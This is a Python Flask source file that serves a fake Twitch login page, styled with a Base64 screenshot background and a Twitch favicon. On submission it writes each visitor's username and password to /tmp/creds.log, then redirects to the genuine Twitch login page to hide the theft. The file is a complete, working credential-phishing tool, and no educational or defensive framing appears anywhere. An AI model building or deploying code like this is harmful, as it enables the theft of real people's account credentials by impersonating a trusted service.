from flask import Flask, request, redirect
from assets import SCREENSHOT_B64, FAVICON_B64  # Ensure these are valid Base64 strings

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Save credentials to temporary storage
        with open('/tmp/creds.log', 'a') as f:
            f.write(f"{username}:{password}\n")
        
        return redirect("https://www.twitch.tv/login")
    
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
      <title>Twitch Login</title>
      <link rel="icon" href="data:image/x-icon;base64,{FAVICON_B64}" type="image/x-icon">
      <style>
        * {{
          box-sizing: border-box;
        }}
        body {{
          margin: 0;
          padding: 0;
          font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
          background-image: url("data:image/png;base64,{SCREENSHOT_B64}");
          background-size: cover;
          background-position: center;
          height: 100vh;
          position: relative;
        }}
        .overlay {{
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-color: rgba(0, 0, 0, 0.6);
          display: flex;
          justify-content: center;
          align-items: center;
        }}
        .login-modal {{
          background-color: white;
          border-radius: 10px;
          width: 400px;
          box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
          padding: 30px;
          position: relative;
          z-index: 10;
        }}
        .close-btn {{
          position: absolute;
          top: 10px;
          right: 15px;
          background: none;
          border: none;
          font-size: 24px;
          font-weight: bold;
          cursor: pointer;
          color: #333;
        }}
        .login-modal h2 {{
          margin-top: 0;
          font-size: 24px;
          font-weight: 600;
          margin-bottom: 25px;
        }}
        label {{
          display: block;
          margin-bottom: 6px;
          font-weight: bold;
          font-size: 14px;
        }}
        .login-modal input[type="text"],
        .login-modal input[type="password"] {{
          width: 100%;
          padding: 12px;
          margin-bottom: 15px;
          border-radius: 5px;
          border: 1px solid #ccc;
          font-size: 16px;
        }}
        .password-wrapper {{
          position: relative;
        }}
        .eye-icon {{
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          cursor: pointer;
          font-size: 16px;
          color: #333;
        }}
        .login-modal a {{
          font-size: 14px;
          color: #9147ff;
          text-decoration: none;
        }}
        .login-modal button.login-button {{
          width: 100%;
          padding: 12px;
          background-color: #9147ff;
          color: white;
          font-size: 16px;
          font-weight: bold;
          border: none;
          border-radius: 999px;
          cursor: pointer;
          margin-top: 20px;
        }}
        .signup {{
          text-align: center;
          margin-top: 15px;
          font-size: 14px;
        }}
        .signup a {{
          color: #9147ff;
          text-decoration: none;
        }}
      </style>
    </head>
    <body>
      <div class="overlay">
        <div class="login-modal">
          <button class="close-btn" onclick="window.location.href='https://www.twitch.tv'">&times;</button>
          <h2>Log in to Twitch</h2>
          <form method="POST" action="/">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required />

            <label for="password">Password</label>
            <div class="password-wrapper">
              <input type="password" id="password" name="password" required />
              <span class="eye-icon" id="eye">&#128065;</span>
            </div>

            <a href="#">Trouble logging in?</a>
            <button type="submit" class="login-button">Log In</button>

            <div class="signup">
              Don’t have an account? <a href="#">Sign up</a>
            </div>
          </form>
        </div>
      </div>

      <script>
        document.getElementById('eye').addEventListener('click', function () {{
          const passwordInput = document.getElementById('password');
          if (passwordInput.type === 'password') {{
            passwordInput.type = 'text';
            this.textContent = '🙈';
          }} else {{
            passwordInput.type = 'password';
            this.textContent = '👁️';
          }}
        }});
      </script>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(debug=True)
